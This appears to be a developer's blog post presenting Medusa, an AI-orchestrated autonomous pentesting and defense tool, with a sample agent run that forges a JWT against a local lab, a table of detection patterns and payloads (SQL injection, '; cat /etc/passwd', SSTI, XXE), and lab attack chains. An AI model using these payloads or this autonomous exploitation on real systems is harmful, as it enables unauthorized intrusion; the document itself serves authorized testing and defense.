## The Spark That Started It All

It was 3 AM on a cold January night when I had my epiphany. I was staring at yet another penetration testing report, manually correlating findings from a dozen different tools, when I thought: *"Why can't this all just work together autonomously?"*

That frustration was the birth of Medusa.

For years, I'd watched security professionals juggle countless tools - nmap for scanning, sqlmap for injection, Metasploit for exploitation, and a dozen more. Each tool was powerful in isolation, but chaining them together into a coherent attack path required human intuition. Meanwhile, defenders struggled to keep up with automated attacks using static rules that attackers easily bypassed.

I realized that what the security community needed wasn't another tool - it was an **AI orchestration layer** that could think like a human security professional but operate at machine speed.

## The Architecture: More Than Just Another Security Tool

```mermaid
graph TB
    subgraph "Medusa Core"
        MAIN[main.py<br/>Mode Selector]
        RED[redteamer.py<br/>LangGraph State Machine]
        BLUE[blueteamer.py<br/>Live Traffic Monitor]
        THINK[think_node.py<br/>ReAct + 7 Action Types]
        TOOLS[dispatch.py<br/>85 Tools]
        SUP[supervisor.py<br/>Pattern Detector]
    end
    subgraph "Red Team"
        NMAP[nmap] & SQLMAP[sqlmap] & GOBUSTER[gobuster]
        META[metasploit] & HYDRA[hydra] & NUCLEI[nuclei]
        PLAY[mcp_playwright]
        MORE[78 more...]
    end
    subgraph "Blue Team"
        FEED[LiveFeed<br/>18 Attack Detectors]
        AI[BlueAIEngine<br/>LLM Decisions]
        KG2[Knowledge Graph<br/>Shared Intel]
        DECEIVE[Tarpit + Honeypot<br/>pfctl Blocking]
        SUB[Per-Endpoint<br/>AI Subagents]
    end
    MAIN --> RED & BLUE
    RED --> THINK --> TOOLS
    BLUE --> FEED --> AI --> DECEIVE
    FEED --> KG2 --> SUB --> AI
    TOOLS --> NMAP & SQLMAP & GOBUSTER & META & HYDRA & NUCLEI & PLAY & MORE
    SUP -.->|every 5 iters| RED
```

Medusa isn't just a collection of security tools wrapped in a script. It's a complete autonomous security platform built around three core innovations:

### 1. The LangGraph State Machine

The heart of Medusa's Red Team capabilities is a LangGraph-based state machine. Unlike traditional linear scripts, this allows the AI agent to:

- **Maintain context** across multiple attack steps
- **Make decisions** based on findings
- **Adapt strategies** when initial approaches fail
- **Chain attacks** across different services and protocols

The state machine tracks everything: what ports were found, what vulnerabilities were discovered, what flags were captured, and what paths remain unexplored.

### 2. The Parallel Subagent System

One of the most powerful features I built is the subagent system. Instead of attacking one vector at a time, Medusa spawns parallel AI agents that each tackle different attack surfaces simultaneously:

~~~
{
  "action": "deploy_subagent",
  "subagent_task": "SQLi on /login || XSS on /search || SSTI on /profile",
  "thought": "Parallelizing attack vectors across all endpoints"
}
~~~

This parallelization dramatically reduces engagement time. A single engagement that might take a human hours can be completed in minutes.

### 3. The Zero-Cost Supervisor

Here's where I got clever. Every AI call costs money, so I built a pattern-matching supervisor that runs every 5 iterations **without any LLM calls**. It watches for common failure modes:

| Pattern | Trigger | Intervention |
|---------|---------|--------------|
| Loop | Same tool 3x consecutively | "Try a DIFFERENT approach" |
| Bookkeeping Trap | 4+ turns of notes/jobs | "STOP documenting. START exploiting NOW." |
| Missed Flag | `FLAG{...}` found but not claimed | "Claim it IMMEDIATELY with claim_flag." |
| Unfollowed Vuln | Vulnerability discovered, no follow-up | "Test the vulnerability NOW. Don't pivot." |
| Stall | 5 turns with no new info | "Radically change approach or generate report." |

This supervisor acts like a senior engineer looking over the agent's shoulder, catching mistakes before they waste time and money.

## The Dual-Mode Capability: Attack and Defend

What makes Medusa truly unique is its dual-mode architecture. The same engine can operate in two completely different personas:

### Red Team Mode: Autonomous Offense

In Red Team mode, Medusa follows a 15-step engagement pipeline:

1. **Reconnaissance** - Port scanning, service detection, technology fingerprinting
2. **Enumeration** - Directory brute-forcing, subdomain discovery, endpoint mapping
3. **Vulnerability Discovery** - SQL injection, XSS, SSRF, command injection detection
4. **Exploitation** - Automated exploitation of found vulnerabilities
5. **Post-Exploitation** - Lateral movement, privilege escalation, data exfiltration
6. **Reporting** - Comprehensive Markdown reports with Mermaid attack-chain diagrams

The system supports **85 tools**, **48 modules**, and **51 attack skills**. I've integrated everything from nmap and sqlmap to custom GraphQL and JWT attack modules.

Here's what a typical engagement looks like:

~~~
$ python3 medusa/main.py
Select mode: [1] Red Team

[medusa-red] Starting reconnaissance on 127.0.0.1:5800,5801,5802

> execute_terminal nmap -sV -sC -p 5800,5801,5802 127.0.0.1
  PORT     STATE SERVICE  VERSION
  5800/tcp open  http     Werkzeug/3.0.1 (Python)
  5801/tcp open  http     Werkzeug/3.0.1 (Python)
  5802/tcp open  http     Werkzeug/3.0.1 (Python)

[medusa-red] Discovered .git leak on port 5800
> execute_terminal curl http://127.0.0.1:5800/.git/COMMIT_EDITMSG
  output: jwt_s3cr3t_cbn_2026

[medusa-red] Forging JWT token with discovered secret
> python3 -c "import jwt; print(jwt.encode({'user_id':1,'role':'admin'},'jwt_s3cr3t_cbn_2026',algorithm='HS256'))"
  output: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

[medusa-red] Accessing admin panel with forged token
> curl http://127.0.0.1:5800/admin/flag -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
  output: FLAG{admin_panel_rce}

[medusa-red] CLAIMED FLAG: FLAG{admin_panel_rce}
~~~

The entire engagement cost **$0.42** in API calls. Compare that to a human pentester costing hundreds of dollars per hour.

### Blue Team Mode: Autonomous Defense

The Blue Team mode is where Medusa truly shines. It transforms from attacker to defender, monitoring traffic in real-time through **18 attack pattern detectors**:

| # | Pattern | Weight | Example |
|---|---------|--------|---------|
| 1 | SQL Injection | 5 | `admin' OR '1'='1` |
| 2 | XSS | 5 | `<script>alert()</script>` |
| 3 | Path Traversal | 4 | `../../etc/passwd` |
| 4 | SSRF | 5 | `169.254.169.254` |
| 5 | Command Injection | 5 | `; cat /etc/passwd` |
| 6 | SSTI | 4 | `{{7*7}}` |
| 7 | XXE | 5 | `<!DOCTYPE foo [` |
| 8 | JWT Attack | 3 | `alg:none` |
| 9 | Deserialization | 5 | `pickle.loads` |
| 10 | LDAP Injection | 4 | `(&(uid=*)(|` |
| 11 | NoSQL Injection | 4 | `{"$ne": null}` |
| 12 | Scanner User-Agent | 4 | `sqlmap/1.7` |
| 13 | Mass Assignment | 4 | `"role":"admin"` |
| 14 | Auth Bypass Header | 5 | `X-Admin: true` |
| 15 | Brute Force | 3 | Multiple password attempts |
| 16 | File Inclusion | 5 | `php://filter` |
| 17 | GraphQL Attack | 3 | `__schema` |
| 18 | Path Traversal | 4 | `../` |

When an attack is detected, the AI decision engine kicks in:

~~~
{
  "verdict": "FLAGGED",
  "score": 9,
  "action": "DECEIVE",
  "attack_analysis": "SQL injection in username field using OR 1=1 bypass",
  "attacker_assessment": "Automated scanner using sqlmap",
  "reasoning": "Classic SQLi pattern. Endpoint uses raw string concatenation.",
  "commands_to_run": [
    "echo '{\"127.0.0.1\":{\"delay\":5}}' > /tmp/blue_tarpit.json"
  ],
  "code_changes": [
    {
      "file": "vulnerable_app.py",
      "change": "Parameterize SQL query in login endpoint",
      "new_content": "def login(): ... user = conn.execute('SELECT * FROM users WHERE username=?', (username,)).fetchone()"
    }
  ]
}
~~~

The system then executes defensive countermeasures:

- **Tarpit:** Adds 5-8 second delays to slow attackers
- **Block:** Network-level blocking via pfctl/iptables
- **Patch:** Directly modifies source code to fix vulnerabilities
- **Deceive:** Deploys honeypots and canary tokens

## The Built-In Vulnerable Labs

I built two deliberately vulnerable applications that ship with Medusa so users can test it safely:

### CloudBoard Next (15 Vulnerabilities, 5 Flags)

~~~
python3 medusa/lab/cloudboard_next/app.py
~~~

A realistic multi-service SaaS with JWT auth, GraphQL, SSE notifications, and multi-tenant isolation:

| Vulnerability | Location | Difficulty | Attack Chain |
|---------------|----------|------------|--------------|
| SQLi Login Bypass | `POST /login` :5800 | Easy | `admin' OR '1'='1' --` |
| JWT alg:none + kid injection | All JWT endpoints | Medium | Forge admin token >> access /admin |
| OAuth open redirect | `/oauth/authorize` | Medium | Token theft via redirect_uri bypass |
| GraphQL introspection + IDOR | `/graphql` | Medium | Schema dump >> cross-tenant user query |
| GraphQL mass assignment | `updateProfile` mutation | Medium | Set role=admin on any user |
| SSTI (email templates) | `/admin/templates` | Medium | `{{config}}` >> server RCE |
| Stored XSS + SSE broadcast | Comments >> `/ws` | Medium | `<script>` >> all connected clients |
| SSRF (webhook tester) | `/admin/webhooks/test` | Hard | >> :5801 internal API >> flag |
| XXE (SVG OCR upload) | `/files/ocr` | Hard | DOCTYPE entity >> file read |
| Command injection (export) | `/admin/export` | Medium | `; cat /tmp/flag` |

### DevOps Dashboard (8 Vulnerabilities)

~~~
python3 medusa/lab/devops_dashboard/app.py
~~~

Internal monitoring tool with command injection, SSTI, SQL injection, path traversal, and hardcoded credentials.

## Testing and Quality Assurance

I take quality seriously. Medusa has **360 tests** covering every major component:

~~~
$ python3 -m pytest medusa/tests/ -v -q

medusa/tests/test_agent_helpers.py .......                                [  8%]
medusa/tests/test_ai_calls.py ...                                        [ 12%]
medusa/tests/test_blue_team.py ...............                           [ 30%]
medusa/tests/test_core.py .................                              [ 50%]
medusa/tests/test_graph.py sss..s...s.ss.....                            [ 75%]
medusa/tests/test_integration.py ..........                              [ 87%]
medusa/tests/test_tools.py ............                                  [100%]

83 passed, 7 skipped in ~1s
~~~

CI/CD runs on GitHub Actions with Python 3.10/3.11/3.12 matrix builds, pytest coverage, pyright type checking, ruff linting, and pip-audit dependency scanning.

## Installation: One Command

I made installation dead simple:

~~~
curl -fsSL https://raw.githubusercontent.com/0xwi11iam/Medusa/main/install.sh | bash
medusa doctor    # Verify the environment
medusa           # Launch the interface
~~~

Or for manual setup:

~~~
git clone https://github.com/0xwi11iam/Medusa.git && cd Medusa
python3 -m venv .venv && source .venv/bin/activate
pip install -r medusa/requirements.txt
python3 medusa/main.py
~~~

## The Vision for Medusa

When I started this project, I wanted to create something that would transform how security professionals work. The vision is a world where:

- **Bug bounty hunters** can automate reconnaissance across thousands of targets
- **Security researchers** can explore novel attack paths with AI assistance
- **CTF players** can speed-run challenges with parallelized attacks
- **SOC defenders** can deploy autonomous defense that watches every endpoint

Medusa isn't meant to replace human security professionals - it's meant to amplify their capabilities. The AI handles the repetitive, time-consuming work while humans focus on strategy, novel vulnerabilities, and high-value targets.

## The Journey Continues

Medusa is under active development. The current v2.4 is stable, but I have big plans:

- **One-command installer** - Full `pip install medusa` experience
- **Enhanced subagent system** - Better parallelization and orchestration
- **More attack modules** - Expanding from 85 to 100+ tools
- **Improved Blue Team** - More deception tactics and automated patching
- **Enterprise features** - API, web dashboard, team collaboration

## Try It Yourself

Medusa is open-source and free to use for authorized testing, education, and research. You can find it on GitHub:

**[https://github.com/0xwi11iam/Medusa](https://github.com/0xwi11iam/Medusa)**

But remember - with great power comes great responsibility. This is a potent tool that can cause serious damage if used improperly. Only use it on systems you own or have explicit written permission to test.

## Acknowledgments

This project wouldn't have been possible without:

- **Roland Poon** - Designer and Project Manager
- The **LangChain/LangGraph** team for their incredible framework
- The open-source security community for their tools and libraries
- Inspiration from **RedAmon** and **Sakana Fugu**

---
